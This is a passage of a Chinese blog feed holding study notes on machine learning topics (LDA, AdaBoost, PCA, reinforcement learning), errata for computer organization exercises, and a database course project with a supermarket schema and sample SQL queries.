LDA<strong>)</strong></p><p>线性判别分析的核心：类内方差小，类间间隔大。“君子和而不同，小人同而不和”，是一种降为方法</p><p>#请判断下面说法是否正确：线性判别分析是在最大化类间方差和类内方差的比值(√)</p><p>#在一个监督学习任务中，每个数据样本有4个属性和一个类别标签，每种属性分别有3、2、2和2种可能的取值，类别标签有3种不同的取值。请问可能有多少种不同的样本？（注意，并不是在某个数据集中最多有多少种不同的样本，而是考虑所有可能的样本)()</p><p>乘起来就可以。72</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210118757882_389_20220916221224036219_753_image-20220831232017771.png" alt="image-20220831232017771"><figcaption aria-hidden="true">image-20220831232017771</figcaption></figure><p>记住就可以</p><p>重点：</p><p align="center"><img alt="image-20220831231843333" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210120139847_342_20220916221225672479_673_image-20220831231843333.png" width="50%"></p><p align="center"><img alt="image-20220831232347725" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210123240274_952_20220916221227106679_945_image-20220831232347725.png" width="50%"></p><p align="center"><img alt="image-20220831233241581" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210124487664_976_20220916221229085668_716_image-20220831233241581.png" width="50%"></p><p>ada boosting</p><p><span class="math inline">\(Z_m=\sum_{i=1}^N w_{m, i}\mathrm{e}^{-\alpha_m y G_i\left(x_i\right) \text { 。 }}\)</span>可以把对第 <span class="math inline">\(i\)</span>个训练样本更新后的分布权重写为如下分段函数形式: <span class="math display">\[w_{m+1, i}= \begin{cases}\frac{w_{m, i}}{Z_m} \mathrm{e}^{-\alpha_m},&amp;amp; G_m\left(x_i\right)=y_i \\ \frac{w_{m, i}}{Z_m}\mathrm{e}^{\alpha_m}, &amp;amp; G_m\left(x_i\right) \neq y_i\end{cases}\]</span> 可见, 如果第 <span class="math inline">\(i\)</span>个训练样本无法被第 <span class="math inline">\(m\)</span> 个弱分类器<span class="math inline">\(G_m(x)\)</span> 分类成功,则需要增大该样本权重, 否则减少该样本权重。这样, 被错误分类样本会在训练第 <span class="math inline">\(m+1\)</span> 个弱分类器 <span class="math inline">\(G_{m+1}(x)\)</span> 时被 “重点关注”。</p><p>在第 <span class="math inline">\(m\)</span> 次迭代中, Ada Boosting总是趋向于将具有<font color="Apricot">最小误差的学习模型</font>（err最小的）选做本轮次生成的弱分类器<span class="math inline">\(G_m\)</span>, 促使累积误差快速下降。</p><hr><p>无监督学习</p><p>K-means往往找都是一个局部最优</p><p>聚类迭代满足如下任意一个条件，则聚类停止：</p><p>•已经达到了迭代次数上限</p><p>•前后两次迭代中，聚类质心基本保持不变</p><p align="center"><img alt="image-20220831234829916" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210125709606_805_20220916221230319204_134_image-20220831234829916.png" width="50%"></p><p align="center"><img alt="image-20220831234856133" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210127172626_838_20220916221232576761_180_image-20220831234856133.png" width="50%"></p><p>应当是尽量“不相关”</p><p>•<strong>主成分分析是将𝑛维特征数据映射到𝑙维空间</strong>(<strong>n≫l</strong>)<strong>，去除原始数据之间的冗余性（通过去除相关性手段达到这一目的）。</strong>每一维的样本方差尽可能大</p><p>•<strong>特征人脸方法是一种应用主成份分析来实现人脸图像降维的方法，其本质是用一种称为“特征人脸(eigenface)”的特征向量（而不是像素）按照线性组合形式来表达每一张原始人脸图像，进而实现人脸识别。</strong></p><p>每一个特征人脸的维数与原始人脸图像的维数一样大x 会变小</p><p>特征人脸之间的相关度要尽可能大√</p><p>为了使算法更高效采用了奇异值分解的方法</p><hr><p align="center"><img alt="image-20220901002546496" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210130379164_284_20220916221234267125_288_image-20220901002546496.png" width="50%"></p><p>批量梯度下降算法是在整个训练集上计算损失误差C()。如果数据集较大，则会因内存容量不足而无法完成，同时这一方法收敛速度较慢。随机梯度下降算法是使用训练集中每个训练样本计算所得C()来分别更新参数。虽然，随机梯度下降收敛速度会快一些，但可能出现所优化目标函数震荡不稳定现象。</p><p align="center"><img alt="image-20220901004646914" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210132063072_174_20220916221236054772_109_image-20220901004646914.png" width="50%"></p><p><span class="math display">\[f(x)=\frac{1}{1+\mathrm{e}^{-x}}\]</span> 选取 sigmoid函数作为激活函数, 因为其具有如下优点: (1)概率形式输出, sigmoid函数值域为 <span class="math inline">\((0,1)\)</span>, 因此使 sigmoid函数输出可视为概率值; (2) 单调递增, sigmoid函数对输人 <span class="math inline">\(x\)</span> 取值范围没有限制, 但当 <span class="math inline">\(x\)</span> 大 于一定值后, 函数输出无限趋近于 1 ,而小于一定数值后, 函数输出无限趋近于 0 , 特别地, 当 <span class="math inline">\(x=0\)</span> 时, 函数输出为 <span class="math inline">\(0.5\)</span>; (3) 非线性变化, <span class="math inline">\(x\)</span> 取 值在 0 附近时,函数输出值的变化幅度比较大 (函数值变化陡峭), 意味 着函数在 0附近容易被激活且是非线性变化, 当 <span class="math inline">\(x\)</span>取值很大或很小时, 函数输出值几乎不变, 这是基于概率的一种认识与需要。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210134382419_848_20220916221237401626_567_image-20220901012351440.png" alt="image-20220901012351440"><figcaption aria-hidden="true">image-20220901012351440</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210134382419_848_20220916221237401626_567_image-20220901012351440.png" alt="image-20220901012412558"><figcaption aria-hidden="true">image-20220901012412558</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210137677694_125_20220916221245033698_681_image-20220901012437001.png" alt="image-20220901012437001"><figcaption aria-hidden="true">image-20220901012437001</figcaption></figure><p align="center"><img alt="image-20220901012512732" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210139040872_789_20220916221246660573_722_image-20220901012512732.png" width="50%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210140127492_349_20220916221248004240_176_image-20220901012559806.png" alt="image-20220901012559806"><figcaption aria-hidden="true">image-20220901012559806</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210141391762_346_20220916221249466398_422_image-20220901012619080.png" alt="image-20220901012619080"><figcaption aria-hidden="true">image-20220901012619080</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210143541722_397_20220916221251026834_417_image-20220901012639822.png" alt="image-20220901012639822"><figcaption aria-hidden="true">image-20220901012639822</figcaption></figure><hr><p>强化学习的特征</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210144952030_795_20220916221252634813_271_image-20220901082606079.png" alt="image-20220901082606079"><figcaption aria-hidden="true">image-20220901082606079</figcaption></figure><p align="center"><img alt="image-20220901082635583" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210146158871_774_20220916221254174712_770_image-20220901082635583.png" width="50%"></p><p>一个随机过程实际上是一列随时间变化的随机变量。当时间是离散 量时,一个随机过程可以表示为 <span class="math inline">\(\left\{X_t\right\}_{t=0,1,2, \cdots}\)</span>,这里每个 <span class="math inline">\(X_t\)</span> 都是一个随机变量,这被称为离散随机过程。为了方便分析和求解,通常要求通过合理的问题定义使得一个随机过程满足马尔可夫性 (Markovproperty), 即满足如下性质: <span class="math display">\[P\left(X_{t+1}=x_{t+1} \mid X_0=x_0, X_1=x_1, \cdots,X_t=x_t\right)=P\left(X_{t+1}=x_{t+1} \mid X_t=x_t\right) \text {(式7.1) }\]</span> 这个公式的直观解释为: 下一刻的状态 <span class="math inline">\(X_{t+1}\)</span> 只由当前状态 <span class="math inline">\(X_t\)</span> 决定(而与更早的所有状态均无关)。满足马尔可夫性的离散随机过程被称为马尔可夫链 (Markov chain)。</p><p align="center"><img alt="image-20220901083631487" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210147483095_532_20220916221255863567_937_image-20220901083631487.png" width="50%"></p><ul><li>动作 <span class="math inline">\(-\)</span> 价值函数 (action-valuefunction): <span class="math inline">\(q: S \times A \mapsto\mathbb{R}\)</span>, 其中 <span class="math inline">\(q_\pi(s,a)=\mathbb{E}_\pi\left[G_t \mid S_t=s, A_t=a\right]\)</span>,表示智能体在时刻 <span class="math inline">\(t\)</span> 处于状态 <span class="math inline">\(s\)</span> 时, 选择 了动作 <span class="math inline">\(a\)</span> 后，在 <span class="math inline">\(t\)</span> 时刻后根据策略 <span class="math inline">\(\pi\)</span> 采取行动所获得回报的期望。价值函数和动作 <span class="math inline">\(-\)</span>价值函数反映了智能体在某一策略下所对应状态 序列获得回报的期望,它比回报本身更加准确地刻画了智能体的目标。 注意, 价值函数和动作 <span class="math inline">\(-\)</span> 价值函数的定义之所以能够成立,离不开决策 过程所具有的马尔可夫性, 即当位于当前状态 <span class="math inline">\(s\)</span> 时, 无论当前时刻 <span class="math inline">\(t\)</span> 的取值是多少,一个策略回报值的期望是一定的 (当前状态只与前一状态有关，与时间无关）。（所以不是<span class="math inline">\(q_\pi(s,a,t)\)</span>） 至此, 强化学习可以转化为一个策略学习问题, 其定义为:给定一 个马尔可夫决策过程 <span class="math inline">\(M D P=(S, A, P, R,\gamma)\)</span>, 学习一个最优策略 <span class="math inline">\(\pi^*\)</span>, 对任 意 <span class="math inline">\(s \in S\)</span> 使得 <span class="math inline">\(V_{\pi^*}(s)\)</span> 值最大。</li></ul><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210148664772_929_20220916221257340897_656_image-20220901083736614.png" alt="image-20220901083736614"><figcaption aria-hidden="true">image-20220901083736614</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210149824175_670_20220916221258558310_351_image-20220901083803818.png" alt="image-20220901083803818"><figcaption aria-hidden="true">image-20220901083803818</figcaption></figure><hr><p align="center"><img alt="image-20220901090535698" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210151522208_726_20220916221300893504_791_image-20220901090535698.png" width="50%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210153123121_732_20220916221302843487_985_image-20220901090816141.png" alt="image-20220901090816141"><figcaption aria-hidden="true">image-20220901090816141</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机组成原理习题讲解部分勘误</title>
    <link href="/posts/23086/"/>
    <url>/posts/23086/</url>
    
    <content type="html"><![CDATA[<p>4.12</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E4%B9%A0%E9%A2%98%E8%AE%B2%E8%A7%A3%E9%83%A8%E5%88%86%E5%8B%98%E8%AF%AF/20230828210843270855_989_20221013150014727108_816_image-20220822231146713.png" alt="image-20220822231146713"><figcaption aria-hidden="true">image-20220822231146713</figcaption></figure><p>流水线周期取决于耗时最长的阶段。此处忘记了IF的时钟周期仍为150ps。</p><p>5.6</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E4%B9%A0%E9%A2%98%E8%AE%B2%E8%A7%A3%E9%83%A8%E5%88%86%E5%8B%98%E8%AF%AF/20230828210844556701_290_20221013150016592317_276_image-20220821230253484.png" alt="image-20220821230253484"><figcaption aria-hidden="true">image-20220821230253484</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E4%B9%A0%E9%A2%98%E8%AE%B2%E8%A7%A3%E9%83%A8%E5%88%86%E5%8B%98%E8%AF%AF/20230828210846005959_170_20221013150018066044_526_image-20220821230543233.png" alt="image-20220821230543233"><figcaption aria-hidden="true">image-20220821230543233</figcaption></figure><p>第三问的讲解如上图所示。此处p1和p2的CPI计算有误。原因是未考虑指令缺失造成的代价。<span class="math display">\[CPI=1+平均每条指令阻塞始终周期数\\=1+指令缺失阻塞时钟周期数+数据缺失阻塞时钟周期数\]</span></p><p><span class="math display">\[指令缺失阻塞时钟周期数=\texttt{cache}缺失率*指令缺失代价\\指令缺失代价=\frac{访存时间}{\texttt{cache}命中时间}\]</span></p><p><span class="math display">\[数据缺失阻塞时钟周期数=\texttt{cache}缺失率*访存指令占比*数据缺失代价\\指令缺失代价=\frac{访存时间}{\texttt{cache}命中时间}\]</span></p><p>得到两个CPI分别约为12.54和7.35</p><p>5.12</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E4%B9%A0%E9%A2%98%E8%AE%B2%E8%A7%A3%E9%83%A8%E5%88%86%E5%8B%98%E8%AF%AF/20230828210848319381_189_20221013150019552299_178_image-20220822230445847.png" alt="image-20220822230445847"><figcaption aria-hidden="true">image-20220822230445847</figcaption></figure><p>第三小问关于反置页表。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E4%B9%A0%E9%A2%98%E8%AE%B2%E8%A7%A3%E9%83%A8%E5%88%86%E5%8B%98%E8%AF%AF/20230828210849511576_828_20221013150020954753_868_image-20220822231114457.png" alt="image-20220822231114457"><figcaption aria-hidden="true">image-20220822231114457</figcaption></figure><p>在反置页表中是为每一个物理块设置一个页表项的，视频中也有所阐述,但在计算时依旧是使用的虚拟地址。此处应为$$ PTE= \</p><span class="math display">\[\begin{aligned}&amp;=\frac{\text { Size of physical memory }}{\text { Page size }}\\&amp;=\frac{16 \mathrm{GiB}}{4 \mathrm{KiB}} \\&amp;=\frac{2^{34}}{2^{12}} \\&amp;=2^{22}\end{aligned}\]</span><p>$$</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计组</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据库系统期末工程作业设计</title>
    <link href="/posts/30344/"/>
    <url>/posts/30344/</url>
    
    <content type="html"><![CDATA[<h3 id="期末工程作业">期末工程作业</h3><p class="note note-info">本文暂只提供相关设计思路，不提供最终实现代码。实现方面前端flask或swing上手较为快速，也可尝试其他框架。后端使用mysql数据库，关于连接数据库方式网上很容易搜到，不再赘述。</p><h4 id="需求描述">1. 需求描述</h4><p>疫情期间，学校的润美超市（虚构）需要对商品物资做更详细的管理。为防止供应链出现问题，对商品的供货商需要进行详细的记录，并对顾客的购买记录进行管理。当然，也需要对商品本身和超市内工作人员进行常规的管理。作为典型的数据库应用场景，引入合适的数据管理系统能够更好的落实疫情防控要求，并让超市具有更好的营业效果。</p><p>1.商品根据名称和供应商整理，通过编号标识，记录其价格。同时对于食品还需记录其保质期，以免过期未处理。</p><p>2.进货数据需要包含商品编号、进货价，进货时间等。</p><p>3.超市内有若干工作人员，需要对其个人信息和销售商品所得薪水进行储存。</p><p>4.需要对顾客信息进行储存。并对应购买时间和商品，形成销售日志。</p><h4 id="概念模型er图">2.1 概念模型ER图</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%B7%A5%E7%A8%8B%E4%BD%9C%E4%B8%9A%E8%AE%BE%E8%AE%A1/20230828211224660894_271_20220919004325018293_610_image-20220919004148336.png" alt="image-20220919004148336"><figcaption aria-hidden="true">image-20220919004148336</figcaption></figure><h4 id="关系模式转换">2.2 关系模式转换</h4><p>注：1.普通商品采用使用空值的方式，food与goods共用一张表</p><p>​ 2.斜体代表外键</p><p>goods（<u>goods_id</u>, goods_name, supplier_id, price, good_num,<em>shelf_no</em>)</p><p>//food（<u>goods_id</u>, goods_name, supplier_id, price,shelf_life)</p><p>supplier（<u>sp_id</u>, sp_name, phone, address)</p><p>supply（<u><em>sp_id</em></u>, <u><em>goods_id</em></u>, enter_time,costs)</p><p>employee（<u>emp_no</u>, <u>emp_name</u>, salary)</p><p>customer（<u>cu_id</u>, cu_name)</p><p>buy(<u><em>cu_id</em></u>, <u><em>goods_id</em></u>, buy_time,buy_costs)</p><p>shelf(<u>shelf_id</u>, goods_num_on_shelf)</p><p>sell (<u><em>emp_no</em></u>, <em><u>goods_id</u></em>)</p><h4 id="sql创建关系模式">2.3 SQL创建关系模式</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-befkmalmrh9u69"></i><span>sql</span><div class="collapse show" id="collapse-befkmalmrh9u69"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> goods (   goods_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   shelf_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_name           <span class="hljs-type">varchar</span>(<span class="hljs-number">10</span>)                    <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   price                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_num            <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   shell_life           <span class="hljs-type">timestamp</span>                      <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_GOODS <span class="hljs-keyword">primary</span> key (goods_id));<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> goods   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_GOODS_ON_SHELF <span class="hljs-keyword">foreign</span> key (shelf_id)      <span class="hljs-keyword">references</span> shelf (shelf_id)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> supplier (   sp_id                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   sp_name              <span class="hljs-type">varchar</span>(<span class="hljs-number">10</span>)                    <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   address              <span class="hljs-type">varchar</span>(<span class="hljs-number">10</span>)                    <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   phone                <span class="hljs-type">char</span>(<span class="hljs-number">11</span>)                       <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_SUPPLIER <span class="hljs-keyword">primary</span> key (sp_id));<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> supply (   goods_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   sp_id                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   enter_time           <span class="hljs-type">timestamp</span>                      <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   costs                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_SUPPLY <span class="hljs-keyword">primary</span> key clustered (goods_id, sp_id));<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> customer (   cu_id                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   cu_name              <span class="hljs-type">varchar</span>(<span class="hljs-number">4</span>)                     <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_CUSTOMER <span class="hljs-keyword">primary</span> key (cu_id));<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> shelf (   shelf_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_num_on_shelf   <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_SHELF <span class="hljs-keyword">primary</span> key (shelf_id));<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> employee (   emp_name             <span class="hljs-type">varchar</span>(<span class="hljs-number">4</span>)                     <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   emp_no               <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   salary               <span class="hljs-type">integer</span>                        <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_EMPLOYEE <span class="hljs-keyword">primary</span> key (emp_no));<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> buy (   cu_id                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   buy_time             <span class="hljs-type">timestamp</span>                      <span class="hljs-keyword">null</span>,   buy_costs            <span class="hljs-type">integer</span>                        <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_BUY <span class="hljs-keyword">primary</span> key clustered (cu_id, goods_id));<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> buy   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_BUY_BUY_CUSTOMER <span class="hljs-keyword">foreign</span> key (cu_id)      <span class="hljs-keyword">references</span> customer (cu_id)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> sell (   emp_no               <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_SELL <span class="hljs-keyword">primary</span> key clustered (emp_no, goods_id));<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> sell   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_SELL_SELL_EMPLOYEE <span class="hljs-keyword">foreign</span> key (emp_no)      <span class="hljs-keyword">references</span> employee (emp_no)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> sell   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_SELL_SELL2_GOODS <span class="hljs-keyword">foreign</span> key (goods_id)      <span class="hljs-keyword">references</span> goods (goods_id)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;</code></pre></div></div><h4 id="查询语句样例">2.4 查询语句样例</h4><p>1.单表查询</p><p>查询单价为10元的商品名称</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lfvotslmrh9u69"></i><span>sql</span><div class="collapse show" id="collapse-lfvotslmrh9u69"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> goods_name <span class="hljs-keyword">from</span> goods<span class="hljs-keyword">where</span> price<span class="hljs-operator">=</span><span class="hljs-number">10</span></code></pre></div></div><p>2.多表连接查询</p><p>查询每个厂商生产商品的平均价格</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8v90g6lmrh9u69"></i><span>SQL</span><div class="collapse show" id="collapse-8v90g6lmrh9u69"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> sp_id,<span class="hljs-built_in">avg</span>(price)<span class="hljs-keyword">from</span> supply <span class="hljs-keyword">natural</span> <span class="hljs-keyword">join</span> goods<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> sp_id</code></pre></div></div><p>3.4多表嵌套查询和exist查询</p><p>查询只有一种商品的货架，返回这种商品的名称和货架id</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-v81yk2lmrh9u69"></i><span>sql</span><div class="collapse show" id="collapse-v81yk2lmrh9u69"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> goods_name,shelf_id<span class="hljs-keyword">from</span> goods,shelf<span class="hljs-keyword">where</span> goods.shelf_id<span class="hljs-operator">=</span>shelf.shelf_id <span class="hljs-keyword">and</span> goods.goods_num<span class="hljs-operator">=</span>shelf.goods_num_on_shelf</code></pre></div></div><p>也可以只在goods表中查</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-s6f61glmrh9u69"></i><span>sql</span><div class="collapse show" id="collapse-s6f61glmrh9u69"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> goods_name<span class="hljs-keyword">from</span> goods g1<span class="hljs-keyword">where</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">exists</span> (<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> goods<span class="hljs-keyword">where</span> shelf.id<span class="hljs-operator">=</span>e1.shelf.id <span class="hljs-keyword">and</span>goods_name<span class="hljs-operator">&lt;&gt;</span>e1.goods_name);</code></pre></div></div><p>5.聚合查询</p><p>有10种以上商品的货架，以及拥有的商品种类数</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-kl0s9xlmrh9u69"></i><span>sql</span><div class="collapse show" id="collapse-kl0s9xlmrh9u69"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> shelf_id,<span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)<span class="hljs-keyword">from</span> goods<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> shef_id<span class="hljs-keyword">having</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)<span class="hljs-operator">&gt;</span><span class="hljs-number">10</span>;</code></pre></div></div><h4 id="powerdesigner-绘制er图">3.1 PowerDesigner 绘制ER图</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%B7%A5%E7%A8%8B%E4%BD%9C%E4%B8%9A%E8%AE%BE%E8%AE%A1/20230828211230228848_283_20220919004326633367_468_image-20220415222750452.png" alt="image-20220415222750452"><figcaption aria-hidden="true">image-20220415222750452</figcaption></figure><h4 id="转为关系模型">3.2 转为关系模型</h4><figure><img 